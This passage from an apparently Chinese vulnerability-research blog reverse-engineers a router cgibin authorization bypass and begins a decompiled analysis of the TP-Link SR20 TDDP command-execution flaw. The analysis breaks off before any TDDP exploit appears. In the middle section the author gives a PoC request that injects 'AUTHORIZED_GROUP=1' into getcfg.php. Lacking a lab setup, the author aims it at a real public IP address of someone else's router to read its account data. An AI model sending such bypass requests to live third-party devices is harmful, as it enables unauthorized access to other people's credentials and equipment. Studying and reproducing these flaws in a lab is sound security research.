class="string">&quot;&lt;/description&gt;\n&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;\t\t\t&lt;/entry&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其会打印出很多重要信息</p>
<p>但是，我们首先还是得先知道如何绕过全局变量<code>$AUTHORIZED_GROUP &gt;= 0</code>的检查，我们传入的数据都是先通过登录验证文件<code>htdocs/cgibin</code>进行脚本语言解析后，再将解析好的<code>URL</code>结构发送给这里的<code>php</code>文件。</p>
<p>因此，我们需要逆向分析<code>cgibin</code>文件，由于这里的<code>webserver</code>运行的是<code>php</code>脚本，那么这个二进制文件中重点的就是处理<code>php</code>语言的部分，也就是<code>phpcgi</code></p>
<h2 id="二进制逆向"><a href="#二进制逆向" class="headerlink" title="二进制逆向"></a>二进制逆向</h2><p>针对cgibin进行分析,cgibin做的主要工作便是处理传入的参数并作拼接</p>
<p>我们利用的就是拼接时并没有做有效的检查</p>
<p><code>AUTHORIZED_GROUP</code>变量也可以由post请求传递</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  v11 = sub_405AC0;</span><br><span class="line">LABEL_13:</span><br><span class="line">  v5 = cgibin_parse_request(v11, v6, <span class="number">0x80000</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = sess_validate();</span><br><span class="line">    <span class="built_in">sprintf</span>(v16, <span class="string">&quot;AUTHORIZED_GROUP=%d&quot;</span>, v13);</span><br><span class="line">    sobj_add_string(v6, v16);</span><br><span class="line">    sobj_add_char(v6, <span class="number">10</span>);</span><br><span class="line">    sobj_add_string(v6, <span class="string">&quot;SESSION_UID=&quot;</span>);</span><br><span class="line">    sess_get_uid(v6);</span><br><span class="line">    sobj_add_char(v6, <span class="number">10</span>);</span><br><span class="line">    <span class="built_in">string</span> = sobj_get_string(v6);</span><br><span class="line">    v5 = xmldbc_ephp(<span class="number">0</span>, <span class="number">0</span>, <span class="built_in">string</span>, <span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>并且服务器自带的<code>AUTHORIZED_GROUP</code>变量是拼接在之前的变量之后的</p>
<p>因此如若我们自行传递一个<code>AUTHORIZED_GROUP=1</code>那么</p>
<p><code>getcfg.php</code>读取到的<code>AUTHORIZED_GROUP</code>变量就是我们自己传入的</p>
<p>那么就可以构造poc</p>
<h2 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h2><p>因为没找到这题的环境,所以没办法在本机上复现</p>
<p>不过好在我们能够借助一些网站帮助我们找到公网上使用这个路由器的ip</p>
<p><code>url -d &quot;SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1&quot; &quot;http://47.181.78.181:8080/getcfg.php&quot;</code></p>
<h1 id="TP-Link-SR20-命令执行漏洞"><a href="#TP-Link-SR20-命令执行漏洞" class="headerlink" title="TP-Link SR20 命令执行漏洞"></a>TP-Link SR20 命令执行漏洞</h1><p><code>TDDP</code>协议(<code>TP-LINK Device Debug Protocol</code>) 是<code>TP-LINK</code>申请了专利的一种在<code>UPD</code>通信的基础上设计的协议，而<code>Google</code>安全专家<code>Matthew Garrett</code>在<code>TP-Link SR20</code>设备上的<code>TDDP</code>协议文件中发现了一处可造成 <strong>“允许来自本地网络连接的任意命令执行”</strong> 的漏洞。</p>
<p>TDDP数据包格式</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/735423_5s7k5dx9u5aoe0d.png" alt=""></p>
<p>其中，<code>TDDP</code>报头中的<code>Ver</code>字段是版本号，分为<code>V1</code>和<code>V2</code>两个版本，<code>V1</code>版本是不需要进行身份认证的；<code>Type</code>字段是报文类型，编号及类型的对照如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4：CMD_AUTO_TEST   6: CMD_CONFIG_MAC   7: CMD_CANCEL_TEST</span><br><span class="line">8: CMD_REBOOT_FOR_TEST   0XA:CMD_GET_PROD_ID   0XC: CMD_SYS_INIT </span><br><span class="line">0XD: CMD_CONFIG_PIN   0X30: CMD_FTEST_USB   0X31: CMD_FTEST_CONFIG</span><br></pre></td></tr></table></figure>
<p>根据公开的漏洞信息，<strong>这个漏洞存在于<code>V1</code>版本下的<code>0X31: CMD_FTEST_CONFIG</code>类型处</strong>。</p>
<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>存在漏洞的文件位于<code>/usr/bin/tddp</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [sp+Ch] [bp-8h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [sp+Ch] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = sub_16C90(argc, argv, envp);</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  v4 = sub_936C();</span><br><span class="line">  v7 = sub_16D40(v4);</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">    <span class="keyword">return</span> v7;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是main函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_16C90</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [sp+4h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  dword_21A34 = (<span class="type">int</span>)<span class="built_in">calloc</span>(<span class="number">1u</span>, <span class="number">4u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !dword_21A34 )</span><br><span class="line">    <span class="keyword">return</span> sub_13018(<span class="number">-10201</span>, <span class="string">&quot;no memery&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0</span>; ++i )</span><br><span class="line">    *(_DWORD *)(dword_21A34 + <span class="number">4</span> * i) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sub_16c90</code>就是对内存做一下初始化工作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_16D40</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span> *)dword_21A34);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而<code>sub_16D40</code>就是释放之前分配的内存</p>
<p>因此核心显然是中间的<code>sub_936C</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_936C</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> optval; <span class="comment">// [sp+Ch] [bp-B0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [sp+10h] [bp-ACh] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">timeout</span>;</span> <span class="comment">// [sp+14h] [bp-A8h] BYREF</span></span><br><span class="line">  fd_set readfds; <span class="comment">// [sp+1Ch] [bp-A0h] BYREF</span></span><br><span class="line">  _DWORD *v6; <span class="comment">// [sp+9Ch] [bp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [sp+A0h] [bp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> nfds; <span class="comment">// [sp+A4h] [bp-18h]</span></span><br><span class="line">  fd_set *p_readfds; <span class="comment">// [sp+A8h] [bp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [sp+ACh] [bp-10h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">1</span>;</span><br><span class="line">  optval = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[%s():%d] tddp task start\n&quot;</span>, <span class="string">&quot;tddp_taskEntry&quot;</span>, <span class="number">151</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !sub_16ACC(&amp;v6)</span><br><span class="line">    &amp;&amp; !sub_16E5C(v6 + <span class="number">9</span>)</span><br><span class="line">    &amp;&amp; !setsockopt(v6[<span class="number">9</span>], <span class="number">1</span>, <span class="number">2</span>, &amp;optval, <span class="number">4u</span>)</span><br><span class="line">    &amp;&amp; !sub_16D68(v6[<span class="number">9</span>], <span class="number">1040</span>)</span><br><span class="line">    &amp;&amp; !setsockopt(v6[<span class="number">9</span>], <span class="number">1</span>, <span class="number">6</span>, &amp;v3, <span class="number">4u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v6[<span class="number">11</span>] |= <span class="number">2u</span>;</span><br><span class="line">    v6[<span class="number">11</span>] |= <span class="number">4u</span>;</span><br><span class="line">    v6[<span class="number">11</span>] |= <span class="number">8u</span>;</span><br><span class="line">    v6[<span class="number">11</span>] |= <span class="number">0x10</span>u;</span><br><span class="line">    v6[<span class="number">11</span>] |= <span class="number">0x20</span>u;</span><br><span class="line">    v6[<span class="number">11</span>] |= <span class="number">0x1000</span>u;</span><br><span class="line">    v6[<span class="number">11</span>] |= <span class="number">0x2000</span>u;</span><br><span class="line">    v6[<span class="number">11</span>] |= <span class="number">0x4000</span>u;</span><br><span class="line">    v6[<span class="number">11</span>] |= <span class="number">0x8000</span>u;</span><br><span class="line">    v6[<span class="number">12</span>] = <span class="number">60</span>;</span><br><span class="line">    v0 = v6;</span><br><span class="line">    v0[<span class="number">13</span>] = sub_9340();</span><br><span class="line">    p_readfds = &amp;readfds;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x1F</span>; ++i )</span><br><span class="line">      p_readfds-&gt;__fds_bits[i] = <span class="number">0</span>;</span><br><span class="line">    nfds = v6[<span class="number">9</span>] + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        timeout.tv_sec = <span class="number">600</span>;</span><br><span class="line">        timeout.tv_usec = <span class="number">0</span>;</span><br><span class="line">        readfds.__fds_bits[v6[<span class="number">9</span>] &gt;&gt; <span class="number">5</span>] |= <span class="number">1</span> &lt;&lt; (v6[<span class="number">9</span>] &amp; <span class="number">0x1F</span>);</span><br><span class="line">        v7 = select(nfds, &amp;readfds, <span class="number">0</span>, <span class="number">0</span>, &amp;timeout);</span><br><span class="line">        <span class="keyword">if</span> ( sub_9340() - v6[<span class="number">13</span>] &gt; v6[<span class="number">12</span>] )</span><br><span class="line">          v6[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v7 == <span class="number">-1</span> );</span><br><span class="line">      <span class="keyword">if</span> ( !v7 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ((readfds.__fds_bits[v6[<span class="number">9</span>] &gt;&gt; <span class="number">5</span>] &gt;&gt; (v6[<span class="number">9</span>] &amp; <span class="number">0x1F</span>)) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">        sub_16418(v6);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_16E0C(v6[<span class="number">9</span>]);</span><br><span class="line">  sub_16C18(v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;[%s():%d] tddp task exit\n&quot;</span>, <span class="string">&quot;tddp_taskEntry&quot;</span>, <span class="number">219</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>前面一大坨都是内存初始化以及socket创建之类的</p>
<p>主要关注一下<code>sub_16D68</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_16D68</span><span class="params">(<span class="type">int</span> a1, <span class="type">uint16_t</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">s</span>;</span> <span class="comment">// [sp+8h] [bp-14h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  s.sa_family = <span class="number">2</span>;</span><br><span class="line">  *(_DWORD *)&amp;s.sa_data[<span class="number">2</span>] = htonl(<span class="number">0</span>);</span><br><span class="line">  *(_WORD *)s.sa_data = htons(a2);</span><br><span class="line">  <span class="keyword">if</span> ( bind(a1, &amp;s, <span class="number">0x10</span>u) == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> error(<span class="number">-10103</span>, <span class="string">&quot;failed to bind socket&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的<code>a2</code>是传进来的参数<code>1040</code>，<code>htons</code>函数是将整型变量从主机字节顺序转变成网络字节顺序</p>
<p><code>int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);</code></p>
<p><code>bind()</code> 函数在网络编程中非常重要，它用于将一个套接字（socket）与特定的地址（IP 地址和端口号）绑定在一起，从而使得其他套接字可以通过该地址与之通信。</p>
<p><code>sub_9340</code>函数是获取当前时间,不管</p>
<p>最后两个函数是结束的一些处理,也不管</p>
<p>那就剩下<code>sub_16418</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_16418</span><span class="params">(<span class="type">int</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r3</span></span><br><span class="line">  __int16 v3; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r3</span></span><br><span class="line">  __int16 v5; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r3</span></span><br><span class="line">  _BYTE *v7; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [sp+10h] [bp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">socklen_t</span> addr_len; <span class="comment">// [sp+14h] [bp-28h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">addr</span>;</span> <span class="comment">// [sp+18h] [bp-24h] BYREF</span></span><br><span class="line">  <span class="type">ssize_t</span> v14; <span class="comment">// [sp+28h] [bp-14h]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [sp+2Ch] [bp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v16; <span class="comment">// [sp+30h] [bp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [sp+34h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  addr_len = <span class="number">16</span>;</span><br><span class="line">  n = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>((<span class="type">char</span> *)a1 + <span class="number">45083</span>, <span class="number">0</span>, <span class="number">0xAFC9</span>u);</span><br><span class="line">  <span class="built_in">memset</span>((<span class="type">char</span> *)a1 + <span class="number">82</span>, <span class="number">0</span>, <span class="number">0xAFC9</span>u);</span><br><span class="line">  v16 = (<span class="type">unsigned</span> __int8 *)a1 + <span class="number">45083</span>;</span><br><span class="line">  v15 = (<span class="type">int</span>)a1 + <span class="number">82</span>;</span><br><span class="line">  v14 = recvfrom(a1[<span class="number">9</span>], (<span class="type">char</span> *)a1 + <span class="number">45083</span>, <span class="number">0xAFC8</span>u, <span class="number">0</span>, &amp;addr, &amp;addr_len);</span><br><span class="line">  <span class="keyword">if</span> ( v14 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> error(<span class="number">-10106</span>, <span class="string">&quot;receive error&quot;</span>);</span><br><span class="line">  sub_15458(a1);</span><br><span class="line">  a1[<span class="number">11</span>] |= <span class="number">1u</span>;</span><br><span class="line">  v2 = *v16;</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( sub_15AD8(a1, &amp;addr) )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[<span class="number">13</span>] = sub_9340();</span><br><span class="line">      v17 = sub_15E74(a1, &amp;n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v17 = <span class="number">-10301</span>;</span><br><span class="line">      *(_BYTE *)v15 = <span class="number">1</span>;</span><br><span class="line">      *(_BYTE *)(v15 + <span class="number">1</span>) = v16[<span class="number">1</span>];</span><br><span class="line">      *(_BYTE *)(v15 + <span class="number">2</span>) = <span class="number">2</span>;</span><br><span class="line">      *(_BYTE *)(v15 + <span class="number">3</span>) = <span class="number">8</span>;</span><br><span class="line">      *(_DWORD *)(v15 + <span class="number">4</span>) = htonl(<span class="number">0</span>);</span><br><span class="line">      v5 = (v16[<span class="number">9</span>] &lt;&lt; <span class="number">8</span>) | v16[<span class="number">8</span>];</span><br><span class="line">      v6 = v15;</span><br><span class="line">      *(_BYTE *)(v15 + <span class="number">8</span>) = v16[<span class="number">8</span>];</span><br><span class="line">      *(_BYTE *)(v6 + <span class="number">9</span>) = HIBYTE(v5);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v2 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( sub_15AD8(a1, &amp;addr) )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[<span class="number">13</span>] = sub_9340();</span><br><span class="line">      v17 = sub_15BB8(a1, &amp;n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v17 = <span class="number">-10301</span>;</span><br><span class="line">      *(_BYTE *)v15 = <span class="number">2</span>;</span><br><span class="line">      *(_BYTE *)(v15 + <span class="number">1</span>) = v16[<span class="number">1</span>];</span><br><span class="line">      *(_BYTE *)(v15 + <span class="number">2</span>) = <span class="number">2</span>;</span><br><span class="line">      *(_BYTE *)(v15 + <span class="number">3</span>) = <span class="number">8</span>;</span><br><span class="line">      *(_DWORD *)(v15 + <span class="number">4</span>) = htonl(<span class="number">0</span>);</span><br><span class="line">      v3 = (v16[<span class="number">9</span>] &lt;&lt; <span class="number">8</span>) | v16[<span class="number">8</span>];</span><br><span class="line">      v4 = v15;</span><br><span class="line">      *(_BYTE *)(v15 + <span class="number">8</span>) = v16[<span class="number">8</span>];</span><br><span class="line">      *(_BYTE *)(v4 + <span class="number">9</span>) = HIBYTE(v3);</span><br><span class="line">      sub_15830(a1, &amp;n);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(v15 + <span class="number">3</span>) = <span class="number">7</span>;</span><br><span class="line">    v7 = (_BYTE *)v15;</span><br><span class="line">    *(_BYTE *)(v15 + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">    v7[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">    v7[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">    v7[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">    n = ((*(<span class="type">unsigned</span> __int8 *)(v15 + <span class="number">7</span>) &lt;&lt; <span class="number">24</span>) | (*(<span class="type">unsigned</span> __int8 *)(v15 + <span class="number">6</span>) &lt;&lt; <span class="number">16</span>) | (*(<span class="type">unsigned</span> __int8 *)(v15 + <span class="number">5</span>) &lt;&lt; <span class="number">8</span>) | *(<span class="type">unsigned</span> __int8 *)(v15 + <span class="number">4</span>))</span><br><span class="line">      + <span class="number">12</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">    v8 = a1[<span class="number">11</span>] &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v8 &amp;&amp; sendto(a1[<span class="number">9</span>], (<span class="type">char</span> *)a1 + <span class="number">82</span>, n, <span class="number">0</span>, &amp;addr, <span class="number">0x10</span>u) == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> error(<span class="number">-10105</span>, <span class="string">&quot;tddp_parserHandler sendto error&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> v17;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现了<code>recvfrom()函数</code>，该函数的原型是：<code>ssize_t recvfrom(int sockfd,void *buf,size_t len,unsigned int flags, struct sockaddr *from,socklen_t *fromlen)</code>，用来接收远程主机经指定的<code>socket</code>传来的数据，并把数据传到由参数<code>buf</code>指向的内存空间。</p>
<p>看<code>sub_15E74</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_15E74</span><span class="params">(<span class="type">int</span> a1, _DWORD *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int16 v2; <span class="comment">// r2</span></span><br><span class="line">  __int16 v3; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [sp+Ch] [bp-18h]</span></span><br><span class="line">  _BYTE *v8; <span class="comment">// [sp+10h] [bp-14h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [sp+1Ch] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = (_BYTE *)(a1 + <span class="number">45083</span>);</span><br><span class="line">  v7 = a1 + <span class="number">82</span>;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">82</span>) = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( *(_BYTE *)(a1 + <span class="number">45084</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">          ....</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x31</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[%s():%d] TDDPv1: receive CMD_FTEST_CONFIG\n&quot;</span>, <span class="string">&quot;tddp_parserVerOneOpt&quot;</span>, <span class="number">692</span>);</span><br><span class="line">      v9 = sub_A580(a1);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>这是在检测type,漏洞点在的<code>case 0x31</code>处：</p>
<p>进入<code>sub_A580</code></p>
